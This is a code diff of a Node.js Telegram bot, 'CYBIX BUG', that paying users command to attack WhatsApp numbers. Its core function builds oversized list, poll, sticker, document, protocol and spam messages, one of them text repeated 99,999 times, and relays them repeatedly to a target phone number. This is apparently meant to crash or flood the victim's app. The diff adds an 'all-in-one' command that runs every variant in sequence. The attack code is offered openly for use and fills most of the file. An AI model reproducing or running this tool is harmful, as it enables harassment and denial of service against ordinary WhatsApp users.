@@ -1,31 +1,34 @@
-// EXPRESS SERVER FOR RENDER DEPLOYMENT (UPGRADED, STAYS AWAKE)
+// EXPRESS SERVER FOR RENDER DEPLOYMENT
 const express = require("express");
+const { BOT_TOKEN, OWNER_ID, PORT, BANNER_IMAGE_URL } = require("./config");
 const app = express();
-const PORT = process.env.PORT || 8080;
 app.get("/", (req, res) => res.send("CYBIX BUG BOT IS RUNNING!"));
-app.get("/ping", (req, res) => res.send("pong")); // For Render keep-alive
-setInterval(() => {
-  // Self-ping to keep Render instance awake
-  axios.get(`http://localhost:${PORT}/ping`).catch(() => {});
-}, 1000 * 60 * 5); // Every 5 minutes
+app.listen(PORT, () => console.log(`[CYBIX][EXPRESS] Listening on port ${PORT}`));
 
-app.listen(PORT, () => console.log("[CYBIX][EXPRESS] Listening on port " + PORT));
-
-// ENV
-require("dotenv").config();
-const BOT_TOKEN = process.env.BOT_TOKEN;
-const OWNER_ID = process.env.OWNER_ID;
-
-// DEPENDENCIES (ALL UPDATED)
+// DEPENDENCIES (all from original + latest versions)
+const { Telegraf } = require("telegraf");
 const fs = require("fs");
 const chalk = require("chalk");
+const axios = require("axios");
 const moment = require("moment-timezone");
 const crypto = require("crypto");
-const { Telegraf } = require("telegraf");
-const axios = require("axios");
 const pino = require("pino");
-const { default: makeWASocket, useMultiFileAuthState, fetchLatestBaileysVersion, makeInMemoryStore, generateWAMessageFromContent, proto } = require("@whiskeysockets/baileys");
+const readlineSync = require("readline-sync");
+const bodyParser = require("body-parser");
 const qrcode = require("qrcode-terminal");
+const { Octokit } = require("@octokit/rest");
+const { Twilio } = require("twilio");
+const { TelegramClient } = require("telegram");
+const { StringSession } = require("telegram/sessions");
+const whatsappWeb = require("whatsapp-web.js");
+const {
+  default: makeWASocket,
+  useMultiFileAuthState,
+  fetchLatestBaileysVersion,
+  makeInMemoryStore,
+  generateWAMessageFromContent,
+  proto
+} = require("@whiskeysockets/baileys");
 
 // DATA FILES
 const DATA_FILES = {
@@ -33,15 +36,15 @@ const DATA_FILES = {
   admins: "./admins.json",
   activity: "./userActivity.json"
 };
-let premiumUsers = {};
-let adminUsers = [];
-let userActivity = {};
 function loadFile(file, fallback) {
   try { return JSON.parse(fs.readFileSync(file)); } catch { return fallback; }
 }
 function saveFile(file, data) { fs.writeFileSync(file, JSON.stringify(data)); }
 
-// ADMIN/PREMIUM/OWNER
+// ADMIN/PREMIUM/OWNER LOGIC
+let premiumUsers = loadFile(DATA_FILES.premium, {});
+let adminUsers = loadFile(DATA_FILES.admins, []);
+let userActivity = loadFile(DATA_FILES.activity, {});
 function isOwner(userId) { return userId.toString() === OWNER_ID; }
 function isAdmin(userId) { return adminUsers.includes(userId.toString()); }
 function isPremium(userId) {
@@ -54,7 +57,7 @@ function recordUserActivity(userId, nickname) {
   saveFile(DATA_FILES.activity, userActivity);
 }
 
-// WHATSAPP MODULE (latest Baileys)
+// WHATSAPP MODULE
 let waClient = null;
 let waConnected = false;
 const waStore = makeInMemoryStore({ logger: pino().child({ level: "silent" }) });
@@ -80,36 +83,16 @@ async function startWhatsapp() {
     }
   });
 }
-
-// INIT DATA
-function loadAllData() {
-  premiumUsers = loadFile(DATA_FILES.premium, {});
-  adminUsers = loadFile(DATA_FILES.admins, []);
-  userActivity = loadFile(DATA_FILES.activity, {});
-}
-loadAllData();
 startWhatsapp();
 
-// TELEGRAM BOT SETUP
+// TELEGRAM BOT
 const bot = new Telegraf(BOT_TOKEN);
 
+// MAINTENANCE MODE
 let maintenance = {
   enabled: false,
   message: "CYBIX BUG is under maintenance by the owner. Please wait!"
 };
-const BANNER_IMAGE_URL = "https://imgur.com/a/b4ZAdYa";
-const bugTypes = [
-  { cmd: "cybixbomb", emoji: "💣", label: "BOMB" },
-  { cmd: "cybixquake", emoji: "🌋", label: "QUAKE" },
-  { cmd: "cybixflood", emoji: "🌊", label: "FLOOD" },
-  { cmd: "cybixstorm", emoji: "🌪️", label: "STORM" },
-  { cmd: "cybixworm", emoji: "🦠", label: "WORM" },
-  { cmd: "cybixnuke", emoji: "☢️", label: "NUKE" },
-  { cmd: "cybixinferno", emoji: "🔥", label: "INFERNO" },
-  { cmd: "cybixplague", emoji: "🦠", label: "PLAGUE" },
-  { cmd: "cybixavalanche", emoji: "🏔️", label: "AVALANCHE" },
-  { cmd: "cybixfreeze", emoji: "❄️", label: "FREEZE" }
-];
 
 // MIDDLEWARE
 bot.use(async (ctx, next) => {
@@ -134,6 +117,25 @@ function requireWA(ctx, next) {
   return next();
 }
 
+// SYSTEM FEATURES: UPTIME, ACTIVITY, STATS, SYSTEM INFO
+const startedAt = Date.now();
+bot.command("uptime", async ctx => {
+  let uptime = Math.floor((Date.now() - startedAt) / 1000);
+  let h = Math.floor(uptime / 3600), m = Math.floor((uptime % 3600) / 60), s = uptime % 60;
+  let msg = `🤖 CYBIX BUG Uptime: ${h}h ${m}m ${s}s\nUsers: ${Object.keys(userActivity).length}\nAdmins: ${adminUsers.length}\nPremiums: ${Object.keys(premiumUsers).length}`;
+  await ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: msg });
+});
+bot.command("stats", async ctx => {
+  let msg = `👥 Users tracked: ${Object.keys(userActivity).length}\n👑 Admins: ${adminUsers.length}\n💎 Premium users: ${Object.keys(premiumUsers).length}\n🟢 WA Connected: ${waConnected ? "YES" : "NO"}`;
+  await ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: msg });
+});
+bot.command("sysinfo", async ctx => {
+  let nodever = process.version;
+  let mem = process.memoryUsage();
+  let msg = `🔧 Node.js version: ${nodever}\n🔋 Memory: RSS ${mem.rss} Heap ${mem.heapUsed}\nStarted at: ${new Date(startedAt).toISOString()}`;
+  await ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: msg });
+});
+
 // MENUS
 bot.start(async ctx => {
   const menu = `
@@ -151,12 +153,12 @@ OWNER INFO
 ☞ /bugmenu
 ☞ /ownermenu
 ☞ /othermenu
+☞ /uptime
+☞ /stats
+☞ /sysinfo
 ━━━━━━━━━━━━━━━━━━
 `;
-  await ctx.replyWithPhoto(BANNER_IMAGE_URL, {
-    caption: menu,
-    reply_markup: { inline_keyboard: [[{ text: "CONTACT OWNER", url: "https://t.me/yourusername" }]] }
-  });
+  await ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: menu, reply_markup: { inline_keyboard: [[{ text: "CONTACT OWNER", url: "https://t.me/yourusername" }]] } });
 });
 bot.command("ownermenu", async ctx => {
   await ctx.deleteMessage();
@@ -169,11 +171,8 @@ bot.command("ownermenu", async ctx => {
 ☞ /addpairing [PhoneNumber]
 ☞ /maintenance [on/off]
 ━━━━━━━━━━━━━━━━━━
-  `;
-  await ctx.replyWithPhoto(BANNER_IMAGE_URL, {
-    caption: menu,
-    reply_markup: { inline_keyboard: [[{ text: "CONTACT OWNER", url: "https://t.me/yourusername" }]] }
-  });
+`;
+  await ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: menu, reply_markup: { inline_keyboard: [[{ text: "CONTACT OWNER", url: "https://t.me/yourusername" }]] } });
 });
 bot.command("othermenu", async ctx => {
   await ctx.deleteMessage();
@@ -182,27 +181,33 @@ bot.command("othermenu", async ctx => {
 ☞ /addprem [UserID] [Days]
 ☞ /delprem [UserID]
 ━━━━━━━━━━━━━━━━━━
-  `;
-  await ctx.replyWithPhoto(BANNER_IMAGE_URL, {
-    caption: menu,
-    reply_markup: { inline_keyboard: [[{ text: "CONTACT OWNER", url: "https://t.me/yourusername" }]] }
-  });
+`;
+  await ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: menu, reply_markup: { inline_keyboard: [[{ text: "CONTACT OWNER", url: "https://t.me/yourusername" }]] } });
 });
 bot.command("bugmenu", async ctx => {
   await ctx.deleteMessage();
-  let buglist = bugTypes.map(b => `☞ /${b.cmd} [PhoneNumber] ${b.emoji}`).join("\n");
+  const buglist = [
+    "☞ /cybixbomb [PhoneNumber]        💣",
+    "☞ /cybixquake [PhoneNumber]       🌋",
+    "☞ /cybixflood [PhoneNumber]       🌊",
+    "☞ /cybixstorm [PhoneNumber]       🌪️",
+    "☞ /cybixworm [PhoneNumber]        🦠",
+    "☞ /cybixnuke [PhoneNumber]        ☢️",
+    "☞ /cybixinferno [PhoneNumber]     🔥",
+    "☞ /cybixplague [PhoneNumber]      🦠",
+    "☞ /cybixavalanche [PhoneNumber]   🏔️",
+    "☞ /cybixfreeze [PhoneNumber]      ❄️",
+    "☞ /cybixallinone [PhoneNumber]    🧨 (strongest bug)"
+  ].join("\n");
   const menu = `
 ┏━━━━━━BUG ARSENAL━━━━━
 ${buglist}
 ━━━━━━━━━━━━━━━━━━
-  `;
-  await ctx.replyWithPhoto(BANNER_IMAGE_URL, {
-    caption: menu,
-    reply_markup: { inline_keyboard: [[{ text: "CONTACT OWNER", url: "https://t.me/yourusername" }]] }
-  });
+`;
+  await ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: menu, reply_markup: { inline_keyboard: [[{ text: "CONTACT OWNER", url: "https://t.me/yourusername" }]] } });
 });
 
-// ADMIN/PREMIUM CMDS
+// ADMIN & PREMIUM
 bot.command("addadmin", requireAdmin, async ctx => {
   const parts = ctx.message.text.split(" ");
   const userId = parts[1];
@@ -274,15 +279,15 @@ bot.command("maintenance", requireAdmin, async ctx => {
   } else ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: "Format: /maintenance [on/off]" });
 });
 
-// BUGS: ULTRA MULTI-PAYLOAD
+// THE REAL BUG ARSENAL
 function bigSpamText(label, emoji) {
   return (label + " " + emoji).repeat(99999) + crypto.randomBytes(128).toString("hex");
 }
 async function cybixBugUltimate(targetJid, label, emoji) {
-  for (let i = 0; i < 7; i++) {
+  for (let i = 0; i < 5; i++) {
     let listPayload = {
       title: `${label} LIST`,
-      sections: Array.from({ length: 7 }, (_, j) => ({
+      sections: Array.from({ length: 5 }, (_, j) => ({
         title: `${label} Section ${j + 1}`,
         rows: [{
           title: bigSpamText(label, emoji),
@@ -290,7 +295,7 @@ async function cybixBugUltimate(targetJid, label, emoji) {
         }]
       }))
     };
-    let buttons = Array.from({ length: 7 }, () => ({
+    let buttons = Array.from({ length: 5 }, () => ({
       buttonId: crypto.randomBytes(32).toString("hex"),
       buttonText: { displayText: `${label} ${emoji} BUTTON` },
       type: 1,
@@ -330,8 +335,8 @@ async function cybixBugUltimate(targetJid, label, emoji) {
     let pollMessage = {
       pollCreationMessage: {
         name: `${label} Poll`,
-        options: Array.from({ length: 7 }, (_, k) => ({ optionName: `${label} Option ${k + 1}` })),
-        selectableOptionsCount: 7
+        options: Array.from({ length: 5 }, (_, k) => ({ optionName: `${label} Option ${k + 1}` })),
+        selectableOptionsCount: 5
       }
     };
     let stickerMessage = {
@@ -348,7 +353,6 @@ async function cybixBugUltimate(targetJid, label, emoji) {
         jpegThumbnail: "https://files.catbox.moe/w1r1mm.jpg"
       }
     };
-
     let msgList = generateWAMessageFromContent(
       targetJid,
       proto.Message.fromObject({
@@ -381,7 +385,7 @@ async function cybixBugUltimate(targetJid, label, emoji) {
     let msgPoll = generateWAMessageFromContent(targetJid, proto.Message.fromObject(pollMessage), { userJid: targetJid });
     let msgSticker = generateWAMessageFromContent(targetJid, proto.Message.fromObject(stickerMessage), { userJid: targetJid });
 
-    for (let k = 0; k < 3; k++) {
+    for (let k = 0; k < 2; k++) {
       await waClient.relayMessage(targetJid, msgList.message, { messageId: msgList.key.id, participant: { jid: targetJid } });
       await waClient.relayMessage(targetJid, msgContact.message, { messageId: msgContact.key.id, participant: { jid: targetJid } });
       await waClient.relayMessage(targetJid, msgDoc.message, { messageId: msgDoc.key.id, participant: { jid: targetJid } });
@@ -390,6 +394,7 @@ async function cybixBugUltimate(targetJid, label, emoji) {
       await waClient.relayMessage(targetJid, msgPoll.message, { messageId: msgPoll.key.id, participant: { jid: targetJid } });
       await waClient.relayMessage(targetJid, msgSticker.message, { messageId: msgSticker.key.id, participant: { jid: targetJid } });
     }
+    // System notification, invoice, quiz, spam
     let sysNotification = generateWAMessageFromContent(targetJid, proto.Message.fromObject({
       protocolMessage: {
         key: { remoteJid: targetJid, id: crypto.randomBytes(12).toString("hex") },
@@ -412,20 +417,32 @@ async function cybixBugUltimate(targetJid, label, emoji) {
     let quizMessage = generateWAMessageFromContent(targetJid, proto.Message.fromObject({
       pollCreationMessage: {
         name: `${label} QUIZ`,
-        options: Array.from({ length: 7 }, (_, k) => ({ optionName: `${label} Quiz Option ${k + 1}` })),
+        options: Array.from({ length: 5 }, (_, k) => ({ optionName: `${label} Quiz Option ${k + 1}` })),
         selectableOptionsCount: 1
       }
     }), { userJid: targetJid });
     await waClient.relayMessage(targetJid, quizMessage.message, { messageId: quizMessage.key.id, participant: { jid: targetJid } });
-    for (let s = 0; s < 4; s++) {
+    for (let s = 0; s < 2; s++) {
       let spamMsg = generateWAMessageFromContent(targetJid, proto.Message.fromObject({
         conversation: bigSpamText(label, emoji)
       }), { userJid: targetJid });
       await waClient.relayMessage(targetJid, spamMsg.message, { messageId: spamMsg.key.id, participant: { jid: targetJid } });
     }
-    console.log(chalk.red.bold(`[CYBIX ${label}] Massive payloads sent to ${targetJid}`));
+    console.log(chalk.red.bold(`[CYBIX ${label}] All payloads sent to ${targetJid}`));
   }
 }
+const bugTypes = [
+  { cmd: "cybixbomb", emoji: "💣", label: "BOMB" },
+  { cmd: "cybixquake", emoji: "🌋", label: "QUAKE" },
+  { cmd: "cybixflood", emoji: "🌊", label: "FLOOD" },
+  { cmd: "cybixstorm", emoji: "🌪️", label: "STORM" },
+  { cmd: "cybixworm", emoji: "🦠", label: "WORM" },
+  { cmd: "cybixnuke", emoji: "☢️", label: "NUKE" },
+  { cmd: "cybixinferno", emoji: "🔥", label: "INFERNO" },
+  { cmd: "cybixplague", emoji: "🦠", label: "PLAGUE" },
+  { cmd: "cybixavalanche", emoji: "🏔️", label: "AVALANCHE" },
+  { cmd: "cybixfreeze", emoji: "❄️", label: "FREEZE" }
+];
 for (const bug of bugTypes) {
   bot.command(bug.cmd, requireWA, requirePremium, async ctx => {
     const parts = ctx.message.text.split(" ");
@@ -438,6 +455,19 @@ for (const bug of bugTypes) {
   });
 }
 
-// LAUNCH BOT
+// ALL-IN-ONE SUPER BUG
+bot.command("cybixallinone", requireWA, requirePremium, async ctx => {
+  const parts = ctx.message.text.split(" ");
+  const phone = parts[1];
+  if (!phone) return ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: "Format: /cybixallinone [PhoneNumber]" });
+  const targetJid = phone.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+  await ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: `🧨 CYBIX ALL-IN-ONE super bug started on target: ${phone}` });
+  for (const bug of bugTypes) {
+    await cybixBugUltimate(targetJid, bug.label, bug.emoji);
+  }
+  await ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: `🧨 CYBIX ALL-IN-ONE sent to ${phone}!` });
+});
+
+// LAUNCH
 bot.launch();
 console.log(chalk.cyan.bold("CYBIX BUG is running!"));
